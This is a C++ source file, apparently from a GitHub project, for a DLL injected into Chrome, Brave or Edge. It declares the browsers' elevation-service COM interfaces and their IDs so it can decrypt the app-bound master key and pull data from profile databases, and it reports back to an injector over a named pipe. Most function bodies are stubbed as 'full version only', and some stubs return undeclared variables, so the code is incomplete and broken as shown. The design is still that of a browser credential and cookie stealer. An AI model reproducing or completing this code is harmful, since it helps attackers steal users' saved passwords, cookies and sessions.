// chrome_decrypt.cpp
// github: s4yr3x
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>

#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <functional>
#include <any>
#include <unordered_map>
#include <set>

#include "reflective_loader.h"
#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace Payload
{

    namespace Utils
    {
        fs::path GetLocalAppDataPath()
        {
             // [DllModule] This functionality is part of the full version only.
        }

        std::optional<std::vector<uint8_t>> Base64Decode(const std::string& input)
        {
             // [DllModule] This functionality is part of the full version only.
        }

        std::string BytesToHexString(const std::vector<uint8_t>& bytes)
        {
             // [DllModule] This functionality is part of the full version only.
        }

        std::string EscapeJson(const std::string& s)
        {
             // [DllModule] This functionality is part of the full version only.
        }
    }

    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        const std::unordered_map<std::string, Config>& GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data"}} };
            return browser_configs;
        }

        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = { 0 };
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto& configs = GetConfigs();
            if (processName == "chrome.exe")
                return configs.at("chrome");
            if (processName == "brave.exe")
                return configs.at("brave");
            if (processName == "msedge.exe")
                return configs.at("edge");

        }

        void KillProcesses(const std::wstring& processName)
        {
             // [DllModule] This functionality is part of the full version only.
        }
    }

    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = { 'A', 'P', 'P', 'B' };
        const std::string V20_PREFIX = "v20";

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob)
        {
             // [DllModule] This functionality is part of the full version only.
        }

        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path& localStatePath) {
             // [DllModule] This functionality is part of the full version only.
        }
    }

    namespace Data
    {
        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            std::function<std::optional<std::any>(sqlite3*)> preQuerySetup;
            std::function<std::optional<std::string>(sqlite3_stmt*, const std::vector<uint8_t>&, const std::any&)> jsonFormatter;
        };

        const std::vector<ExtractionConfig> &GetExtractionConfigs()
        {
            // [DllModule] This functionality is part of the full version only.

        try
        {
            // [DllModule] This functionality is part of the full version only.
        }
        catch (...)
        {
            return std::nullopt;
        }
        // [DllModule] This functionality is part of the full version only.
        }
    }
    class DecryptionSession
    {
    public:
        DecryptionSession(LPVOID lpPipeNamePointer) : m_config(Browser::GetConfigForCurrentProcess())
        {
            // [DllModule] This functionality is part of the full version only.
        }

        void Run()
        {
            // [DllModule] This functionality is part of the full version only.
        }

        void Log(const std::string& message)
        {
            // [DllModule] This functionality is part of the full version only.
        }

        ~DecryptionSession()
        {
            // [DllModule] This functionality is part of the full version only.
        }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
        bool m_verbose = false;
        bool m_comInitialized = false;
        fs::path m_outputPath;
        Browser::Config m_config;

        void InitializePipe(LPVOID lpPipeNamePointer)
        {
            // [DllModule] This functionality is part of the full version only.
        }

        void ReadPipeParameters()
        {
            // [DllModule] This functionality is part of the full version only.
        }

        void InitializeCom()
        {
            // [DllModule] This functionality is part of the full version only.
        }

        std::vector<uint8_t> DecryptMasterKey()
        {
            // [DllModule] This functionality is part of the full version only.
            return aesKey;
        }

        void ExtractAllData(const std::vector<uint8_t>& aesKey)
        {
            // [DllModule] This functionality is part of the full version only.
        }

        void ExtractDataFromProfile(const fs::path& profilePath, const Data::ExtractionConfig& dataCfg, const std::vector<uint8_t>& aesKey)
        {
            // [DllModule] This functionality is part of the full version only.
        }
    };
}

struct ThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromInjector;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    // [DllModule] This functionality is part of the full version only.

    std::unique_ptr<Payload::DecryptionSession> session = nullptr;
    try
    {
        // [DllModule] This functionality is part of the full version only.
    }
    catch (const std::exception& e)
    {
    }

    session.reset();
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ThreadParams{ hModule, lpReserved };
        if (!params)
            return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
